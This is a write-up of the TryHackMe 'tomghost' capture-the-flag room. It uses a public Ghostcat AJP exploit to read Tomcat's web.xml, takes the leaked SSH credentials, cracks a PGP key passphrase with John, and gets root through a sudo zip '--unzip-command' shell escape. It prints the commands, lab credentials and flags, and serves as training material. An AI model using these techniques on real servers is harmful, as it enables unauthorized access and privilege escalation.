## tomghost - TryHackMe Writeup

[Room Link](https://tryhackme.com/room/tomghost)

<i>The machine may take up to 5 minutes to boot and configure.</i>

<i>Admins Note: This room contains inappropriate content in the form of a username that contains a swear word and should be noted for an educational setting. - Dark</i>

**IP: 10.10.120.105**

---

## 📌 General Information

**Room Difficulty**: Easy  <br>

**Room Type**: Linux Privilege Escalation <br>

**Tools Used**: Nmap, Gobuster, John The Ripper<br>

**Author**: <br>

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/LOGO%20NEW.png"/>](https://github.com/mauzware)

[TryHackMe Profile](https://tryhackme.com/p/mauzinho) <br>
[GitHub Profile](https://github.com/mauzware)

---

## 🔍 Enumeration

- As always, I start with Nmap and Gobuster.

  ```
  nmap -sC -sV -T5 -p- 10.10.120.105

  PORT     STATE SERVICE    VERSION
  22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)
  |   256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA)
  |_  256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (ED25519)
  53/tcp   open  tcpwrapped
  8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
  | ajp-methods: 
  |_  Supported methods: GET HEAD POST OPTIONS
  8080/tcp open  http       Apache Tomcat 9.0.30
  |_http-favicon: Apache Tomcat
  |_http-title: Apache Tomcat/9.0.30
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  ```

  ```
  gobuster dir -u http://10.10.120.105:8080 -w /usr/share/wordlists/dirb/common.txt 

  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  /docs                 (Status: 302) [Size: 0] [--> /docs/]
  /examples             (Status: 302) [Size: 0] [--> /examples/]
  /favicon.ico          (Status: 200) [Size: 21630]
  /host-manager         (Status: 302) [Size: 0] [--> /host-manager/]
  /manager              (Status: 302) [Size: 0] [--> /manager/]
  Progress: 4614 / 4615 (99.98%)
  ===============================================================
  Finished
  ===============================================================
  ```
  
- OK, so port 8009 with `ajp13` looks pretty suspicious to me and I wanted to exploit it, I found the right Ghostcat exploit for reading `/WEB-INF/web.xml` on the vulnerable server. You can find the exploit [here](https://github.com/00theway/Ghostcat-CNVD-2020-10487.git), it's a pretty cool one.
  
- I also did some digging on the web app, specifically through `manager-gui` since I already did the CTF room with that type of exploitation but unfortunately couldn't make it work. Let's move to exploitation and gaining access!

---

## ⚙️ Gaining Access

- `AjpShooter` script is easy to use, you clone the repo and then run the script with Python. It requires two arguments, `host` and `port`, after these inputs add the `/WEB-INF/web.xml` with flag `read` and it's done.
  We want to read `/WEB-INF/web.xml` since it contains credentials. Here's the output of that script. For more details about the script run `python3 ajpShooter -h` or check creators GitHub README.md.

  ```
  git clone https://github.com/00theway/Ghostcat-CNVD-2020-10487.git
  cd CNVD-2020-10487

  python3 ajpShooter.py http://10.10.120.105:8080 8009 /WEB-INF/web.xml read

   /_\  (_)_ __   / _\ |__   ___   ___ | |_ ___ _ __
  
         _    _         __ _                 _            
        /_\  (_)_ __   / _\ |__   ___   ___ | |_ ___ _ __ 
       //_\\ | | '_ \  \ \| '_ \ / _ \ / _ \| __/ _ \ '__|
      /  _  \| | |_) | _\ \ | | | (_) | (_) | ||  __/ |   
      \_/ \_// | .__/  \__/_| |_|\___/ \___/ \__\___|_|   
           |__/|_|                                        
                                                  00theway,just for test
      
  
  [<] 200 200
  [<] Accept-Ranges: bytes
  [<] ETag: W/"1261-1583902632000"
  [<] Last-Modified: Wed, 11 Mar 2020 04:57:12 GMT
  [<] Content-Type: application/xml
  [<] Content-Length: 1261
  
  <?xml version="1.0" encoding="UTF-8"?>
  <!--
   Licensed to the Apache Software Foundation (ASF) under one or more
    contributor license agreements.  See the NOTICE file distributed with
    this work for additional information regarding copyright ownership.
    The ASF licenses this file to You under the Apache License, Version 2.0
    (the "License"); you may not use this file except in compliance with
    the License.  You may obtain a copy of the License at
  
        http://www.apache.org/licenses/LICENSE-2.0
  
    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
  -->
  <web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                        http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
    version="4.0"
    metadata-complete="true">
  
    <display-name>Welcome to Tomcat</display-name>
    <description>
       Welcome to GhostCat
          skyfuck:8730281lkjlkjdqlksalks
    </description>
  
  </web-app>
  ```
  
- Awesome! With obtained credentials `skyfuck:8730281lkjlkjdqlksalks`, I logged in with SSH and got into the system. Flags here I come!

---

## 🧍 User Privilege Escalation

- As with any other CTF, getting user flag is pretty simple and straightforward, just dig around and you'll find it!

  ```
  skyfuck@ubuntu:~$ whoami
  skyfuck
  
  skyfuck@ubuntu:~$ pwd
  /home/skyfuck
  
  skyfuck@ubuntu:~$ ls
  credential.pgp  tryhackme.asc
  skyfuck@ubuntu:~$ 
  
  
  skyfuck@ubuntu:/home/merlin$ cat user.txt
  THM{GhostCat_1s_so_cr4sy}
  ```
  
- User flag checked! So now moving to root. When I used `sudo -l` as this user I got permission denied which is fine, but the thing is, in his home directory there are two files that are important to us: `credential.pgp` and `tryhackme.asc`.
  
- So when I saw them, I immediately thought that after cracking them I'll get root credentials, but little did I know tho... Transfer those files to your Kali machine, convert `.asc` file into hash and crack it in order to get passphrase for cracking `.pgp`

  ```
  gpg2john tryhackme.asc > keyhash.txt
  
  john --wordlist=/rockyou.txt keyhash.txt 
  alexandru        (tryhackme)
  ```

- Perfect, passphrase obtained from cracking PGP Private Key, now let's decrypt the `.pgp` file in order to get credentials. Process is very simple, import the `.asc` key and then decrypt the `.pgp` file.
  When you are prompted to insert passphrase, use the passphrase that we found in previous step.

  ```
  gpg --import tryhackme.asc 
  gpg: key ABCDE12345FKSJF58: public key "tryhackme <stuxnet@tryhackme.com>" imported
  gpg: key ABCDE12345FKSJF58: secret key imported
  gpg: key ABCDE12345FKSJF58: "tryhackme <stuxnet@tryhackme.com>" not changed
  gpg: Total number processed: 2
  gpg:               imported: 1
  gpg:              unchanged: 1
  gpg:       secret keys read: 1
  gpg:   secret keys imported: 1
  
  gpg --output decrypted.txt --decrypt credential.pgp
  gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
  gpg: encrypted with 1024-bit ELG key, ID ABCDE12345FKSJF58-, created 2020-03-11
        "tryhackme <stuxnet@tryhackme.com>"

  cat decrypted.txt 
  merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
  ```

- Legoooo, credentials for another user obtained! Firstly I thought that this is a hash, but little did I know that is just a password for SSH. I ran it through John and Haiti anyway and got nothing.

  ```
  haiti -e asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j                                   
  BigCrypt [JtR: bigcrypt]

  echo 'asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j' > merlin.hash

  john --wordlist=/rockyou.txt --format=bigcrypt merlin.hash
  ```

---

## 👑 Root Privilege Escalation

- Now finishing the job. You will need to login as `merlin` in order to escalate privileges, when you run `id` on both users you will see the difference in output.

  ```
  merlin@ubuntu:~$ id
  uid=1000(merlin) gid=1000(merlin) groups=1000(merlin),4(adm),24(cdrom),30(dip),46(plugdev),114(lpadmin),115(sambashare)
  
  merlin@ubuntu:~$ cat /root/root.txt
  cat: /root/root.txt: Permission denied
  ```
  
- What I always do first is `sudo -l`, when I ran it with previous user I got permission denied, but with `merlin` it's a completely different story.

  ```
  merlin@ubuntu:~$ sudo -l
  Matching Defaults entries for merlin on ubuntu:
      env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
  
  User merlin may run the following commands on ubuntu:
      (root : root) NOPASSWD: /usr/bin/zip
  ```
  
- That's it, zip is our way to root since we can run it with sudo privileges without needing a password. You can find the commands on how to escalate on [GTFOBins](https://gtfobins.github.io/gtfobins/zip/) but I used a different method, both methods will work and they do the exact same thing.

- This was my approach. First, I created a simple shell script and made it executable.

  ```
  merlin@ubuntu:~$ echo 'sh' > shell.sh
  merlin@ubuntu:~$ chmod +x shell.sh
  ```

- Now since I have shell, I abused zip’s `-T` and `--unzip-command` options to execute my shell. The `-T` flag is for testing the archive, and `--unzip-command="sh #"` tells zip to use sh to extract files. Since the command runs with sudo, it gives me a root shell.

  ```
  merlin@ubuntu:~$ sudo zip exploit.zip shell.sh -T --unzip-command="sh #"
  adding: shell.sh (stored 0%)
  # whoami
  root
  # cat /root/root.txt
  THM{Z1P_1S_FAKE}
  ```

- CTF done, cya in the next one! 💋

---

## 🏁 Flags

- **User Flag**: `THM{GhostCat_1s_so_cr4sy}`
- **Root Flag**: `THM{Z1P_1S_FAKE}`

---

## 💬 Notes & Reflections

- What was challenging in this room for me?
  `Finding the right exploit as always. AjpShooter exploit is so sick ngl!`

- What did I learn?
  `New exploits and a new way of privilege escalation. Escalating to root with ZIP is awesome!`

- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!

- Thank you for reading! Enjoy, Have Fun and Happy Hacking! 🤟

---
